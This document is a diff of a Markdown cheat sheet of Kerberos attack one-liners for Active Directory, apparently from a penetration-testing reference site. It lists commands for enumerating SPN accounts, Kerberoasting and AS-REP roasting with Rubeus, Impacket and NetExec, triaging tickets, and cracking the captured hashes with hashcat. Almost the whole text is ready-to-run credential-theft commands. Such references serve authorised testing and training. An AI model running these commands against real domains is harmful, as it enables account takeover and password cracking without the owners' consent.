@@ -1,68 +1,94 @@
 # Kerberos
 
-One-liners for common Kerberos discovery and testing workflows.
+SPNs, roasting candidates, tickets and common Kerberos discovery.
 
-### Find SPNs
+<div class="ol-section-kicker"><span>AD</span></div>
 
-```powershell
-Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
-```
-
-**Tool:** PowerView · **Platform:** Windows · **Tags:** Kerberos, SPN
-
-### Kerberoast with Rubeus
+## PowerView SPN users
 
 ```powershell
-Rubeus.exe kerberoast /outfile:kerberoast.txt
+Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
 ```
 
-**Tool:** Rubeus · **Platform:** Windows · **Tags:** Kerberos, Kerberoasting
+**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user
 
-### Kerberoast with Impacket
+
+## NetExec Kerberoasting
 
 ```bash
-GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast.txt
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, Kerberoasting
+**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user
 
-### AS-REP roast with Rubeus
+
+## Impacket Kerberoast
+
+```bash
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
+```
+
+**Tool:** Impacket · **Platform:** Linux/macOS · **Context:** Domain user
+
+
+## PowerView AS-REP candidates
 
 ```powershell
-Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+Get-DomainUser -PreauthNotRequired | Select samaccountname
 ```
 
-**Tool:** Rubeus · **Platform:** Windows · **Tags:** Kerberos, AS-REP
+**Tool:** PowerView · **Platform:** Windows
 
-### AS-REP roast with Impacket
+
+## NetExec AS-REP roasting
 
 ```bash
-GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --asreproast asrep.txt
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, AS-REP
+**Tool:** NetExec · **Platform:** Linux/macOS
 
-### Request TGT
+
+## Impacket AS-REP roasting
 
 ```bash
-getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
+GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep.txt
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, TGT
+**Tool:** Impacket · **Platform:** Linux/macOS
 
-### Use Kerberos cache
 
-```bash
-export KRB5CCNAME=$(pwd)/<USER>.ccache
-```
+## List Windows Kerberos tickets
 
-**Tool:** Kerberos · **Platform:** Linux · **Tags:** Kerberos, ccache
-
-### List Kerberos tickets
-
-```bash
+```cmd
 klist
 ```
 
-**Tool:** Kerberos · **Platform:** Linux/Windows · **Tags:** Kerberos, Tickets
+**Tool:** klist · **Platform:** Windows
 
+
+## Rubeus ticket triage
+
+```cmd
+Rubeus.exe triage
+```
+
+**Tool:** Rubeus · **Platform:** Windows
+
+
+## Hashcat Kerberoast etype 23
+
+```bash
+hashcat -m 13100 kerberoast.txt <WORDLIST>
+```
+
+**Tool:** hashcat · **Platform:** Cross-platform
+
+
+## Hashcat AS-REP etype 23
+
+```bash
+hashcat -m 18200 asrep.txt <WORDLIST>
+```
+
+**Tool:** hashcat · **Platform:** Cross-platform
